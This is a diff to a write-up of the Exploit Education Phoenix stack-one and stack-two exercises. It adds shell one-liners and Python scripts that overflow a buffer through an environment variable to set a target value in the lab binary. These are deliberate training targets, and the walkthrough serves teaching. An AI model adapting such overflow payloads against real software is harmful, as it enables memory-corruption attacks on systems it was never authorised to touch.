@@ -32,10 +32,11 @@ pattern_create.rb -l 100
 
 ```bash
 ./stack-one Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A  
-
-Welcome to phoenix/stack-one, brought to you by https://exploit.education
-Getting closer! changeme is currently 0x63413163, we want 0x496c5962
 ```
+
+>Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Getting closer! changeme is currently 0x63413163, we want 0x496c5962
+
 
 ```bash
 pattern_offset -l 0x63413163
@@ -74,6 +75,50 @@ Well done, you have successfully set changeme to the correct value
 
 
 
+# Stack 2
+
+First running ./stack-two tells us to set the ExploitEducation environment variable.
+
+$ export ExploitEducation="test"
+./stack-two
+
+> Welcome to phoenix/stack-two, brought to you by https://exploit.education
+Almost! changeme is currently 0x00000000, we want 0x0d0a090a
+
+Bummer it looks the program is reading from the environment variable and that is where we can overflow the buffer
+to set the changeme value that we need to pass the challenge.
+
+__python 2__
+```bash
+export ExploitEducation=$(python -c 'print "A" * 64 + "\x0a\x09\x0a\x0d"')
+```
+
+__python3__
+```bash
+export ExploitEducation=$(python3 -c 'print("A"*64+"\x0a\x09\x0a\x0d")')
+```
+
+As python scripts:
+
+__python2__
+```python
+#!/usr/bin/python3
+
+import os
+
+#0x0d0a090a
+#os.environ["ExploitEducation"] = "$(python3 -c 'print(\"A\" * 64 + \"\\x0a\\x09\\x0a\\x0d\")')"
+
+os.system("ExploitEducation=$(python -c 'print \"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\"') /opt/phoenix/amd64/stack-two")
+```
+
+__python3__
+```python3
+#!/usr/bin/python3
+import os
+
+os.system("ExploitEducation=$(python3 -c 'print(\"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\")') /opt/phoenix/amd64/stack-two")
+```
 
 
 
